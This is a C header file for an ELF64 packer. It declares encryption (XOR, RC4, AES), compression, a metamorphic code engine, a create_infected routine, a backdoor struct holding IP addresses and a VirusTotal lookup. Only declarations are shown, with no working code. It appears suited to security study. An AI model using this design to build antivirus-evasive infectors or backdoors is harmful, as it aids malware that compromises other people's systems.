#ifndef MAIN_H
#define MAIN_H

#include <stddef.h>
#include <stdio.h>
#include <time.h>
#include <publib.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <errno.h>
#include <dirent.h>
#include <math.h>
#include <assert.h>
//#include <curl/curl.h>
#include <signal.h>
#include "../bddisasm/inc/bddisasm.h"
#include <openssl/md5.h>
#include <regex.h>
#include <stdint.h>

typedef struct stat	__sy_stat;
////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////
//
//

#define ANSI_COLOR_RED		"\x1b[31m"
#define ANSI_COLOR_GREEN	"\x1b[32m"
#define ANSI_COLOR_YELLOW	"\x1b[33m"
#define ANSI_COLOR_BLUE		"\x1b[34m"
#define ANSI_COLOR_RESET	"\x1b[0m"

#define	AES			"aes"
#define	RC4			"rc4"
#define	XOR			"xor"

#define VALID_AV_SIZE 2

#define ELF_MAGIC_SIZE 4
#define ELF_MAGIC_NUMBER 1179403647
#define PACK_MAGIC_NUMBER 0x15D25

#define X86_64 2

#define PAYLOAD_SIZE 63
#define PAGE_SIZE 4096

#define DEFAULT_SIZE 8

#define VOID __attribute__((unused))
#define NELEMS(x)  (sizeof(x) / sizeof((x)[0]))

////////////////////////////////////////////////////////////////////////////////
/// ENUM
////////////////////////////////////////////////////////////////////////////////

typedef enum
{
	USAGE,
	WRONG_FORMAT,
	WRONG_ARCHITECTURE,
	NOT_EXEC,
	MALLOC_FAIL,
	WRONG_FD,
	STAT_FAIL,
	MMAP_FAIL,
	CORRUPTION,
	PACKED,
	PAYLOAD_EMPTY,
	FILENAME_DENIED,
	FILENAME_TOO_LONG,
	INVALID_PATH,
	UNSUPPORTED_ENCRYPTION,
} t_error;

# define METAMORPH	"--metamorph"
# define SECURITY_GLIBC	"--security-glibc"
# define COMPRESSION	"--compress"
# define STUB		"--stub"
////////////////////////////////////////////////////////////////////////////////
/// STRUCTS
////////////////////////////////////////////////////////////////////////////////
typedef struct		s_list {
	void		*data;
	size_t		len;
	struct s_list	*next;
}			t_list;

// For the generation of assembly instructions
typedef struct  s_hdr
{
    size_t      size;
    void        *content;
    t_list      *begin, *last;
}               t_hdr;

typedef struct		s_mh {
	unsigned char	data[15];
	size_t		size;
}			t_mh;





typedef struct
{
	Elf64_Addr old_entrypoint;

	Elf64_Off segment_offset;
	Elf64_Addr segment_addr;
	Elf64_Xword segment_size;

	Elf64_Off section_offset;
	Elf64_Addr section_addr;
	Elf64_Xword section_size;

	void *ptr;
	size_t filesize;
	char const *filename;
} t_elf;

typedef struct		__attribute__((packed))__sy_stub
{
	struct stat				st;
	const char				filename[PATH_MAX];
	unsigned char				*stub;
}						t__sy_syfer;

typedef struct		__attribute__((packed))__sy_backdoor
{
	char		*ip[10];
}			t__sy_backdoor;


typedef struct		__attribute__((packed))__sy_binary
{
	int					opts;
	char					out_binary_name[PATH_MAX];
	char					*binary_name;
	struct stat				st;
	char                    **stub;
    char					**ip;
}						t__sy_binary;


typedef struct		__attribute__((packed))__syfer
{
	t__sy_binary				*lst_binary;
}						__syfer;



typedef	struct		s_loader {
	struct stat	*st;
	const char	*filename;
	unsigned char	*data;
	struct s_loader	*next;
}			t_loader;



typedef struct		s_bin {
	int		opts;
	char		*out_filename;
	const char	*filename;
	struct stat	*st;
	t_list		*loader;
}			t_bin;

typedef struct	s_packer {
	pid_t		pid_syferSignal;
	uint8_t		verbose;
	t_list		*lst;
    t_list      *header_lst;
}		t_packer;

////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES;
////////////////////////////////////////////////////////////////////////////////

uint8_t __pg_woody( t_bin *, t_packer * );

void error(t_error const err, char const *filename, int line );

t_elf *get_elf( t_bin *bin );

void modify_segments(t_elf *elf, uint32_t );
void modify_sections(t_elf *elf, uint32_t );
void modify_header(t_elf *elf, uint32_t );
void create_infected(t_elf const *elf, t_bin *, char *, uint32_t *);

void _memcpy(void *dst, void const *src, size_t const size);
void _memset(void *dst, int const c, const size_t size);
size_t _strlen(const char *str);

unsigned char *generate_key(const size_t size);

void _xor(char *str, size_t const size, char const *key);
void _rc4(const unsigned char *key, const size_t key_length, char *data, const size_t data_length);

void	_date( void );


// Function for chained lists
void	_pg_clean_list( t_list **list, void(*clear)(void *) );
uint8_t	_pg_push_list( t_list **list, const void *data, size_t len );
size_t	_pg_get_elem( t_list *list );


// Compression
# define BIT_IO_BUFFER 4096
# define DEFAULT_LA_SIZE 15      /* lookahead size */
# define DEFAULT_SB_SIZE 4095    /* search buffer size */
# define N 3
# define MAX_BIT_BUFFER 16
# define BIT_IO_W 0
# define BIT_IO_R 1
struct bitFILE {
	FILE 		*file;
	int 		mode, bytepos, bitpos, read;
	unsigned char *buffer; /* bits buffer */
};

struct token {
    int off, len;
    char next;
};

struct node {
    int len, off, parent, left, right;
};

struct ret {
    int off, len;
};

unsigned char *
_pg_compress( unsigned char *data, size_t size, size_t *outputlen );



// Parameter analysis function
void
_pg_analyze_parameter( const int ac, char **av, t_packer *data );

void
_pg_set_default_parameter( t_packer *data );


// viruse total
char *
__get_file_report( const unsigned char *md5 );


// SyferSignal
int
__launch_syfer_signal( void );

int
__capture_signal (void);


// Utils
void
__display( t_list * );

struct stat 	*__pg_stat( char *filename );
void		    __swap(void *xp, void *yp, size_t len );
int		        __pg_get_random( int, int );
void		    __pg_shuffle( unsigned char *, size_t );
void            __shuffle_int( int *, size_t );
void            __pg_reverse( unsigned char *, int n );
uint64_t        __get_all_size_stub( t_list * );
void            *_pg_memalloc( size_t const );


uint32_t
__pg_make_stub( char *stub, t_bin *bin );

void   *__allocate_mem_and_set_number( const int n );


// ------------------------------------ //
// -- PROTOTYPES METAMORPH FUNCTIONS -- //
// ------------------------------------ //

# define __MH_PUSH   0x00
# define __MH_POP    0x01

struct s_mth {
    unsigned char   ins[ND_MAX_INSTRUCTION_LENGTH];
    uint8_t          length;
};

// Metamorph debug
void	___MH_DEBUG_print( t_list * );
void    ___MH_debug_str( unsigned char *, size_t );
void	___MH_debug_st( INSTRUX ix );

// Metamorph
unsigned char	*__MH_pop_regX64( unsigned char, int * );
unsigned char 	*__MH_push_regX64( unsigned char, int * );
t_list	*__MH_generation_PUSH_POP_regX64( unsigned char *, int, int );
unsigned char   *__MH_nop( int nb, int *size );

uint32_t	__MH_instruction_substitution( char *, uint32_t * );
uint32_t	__MH_variable_substitution( char *, uint32_t * );
uint32_t	__MH_insertion_of_connection( char *, uint32_t *);
uint32_t	__MH_dead_code_insertion( char *, uint32_t * );
void		__MH_permutation_instruction( char *, uint32_t * );
uint32_t	__MH_metamorph( char *, uint32_t * );

// Utils Metamorph
size_t  __size_instruction_lst( t_list *lst );


// clear
void    __pg_cl_MH( void *data );

// List

t_hdr   *_pg_alloc_header_list( void );

void    _clear_header( t_hdr **, void(*clear)(void *) );
void    __delete_header( void * );


// Encryption
void __pg_AES_encrypt(char *key, char *value, size_t len );




int	analyze_parameter( int, char **);
#endif /* MAIN_H */
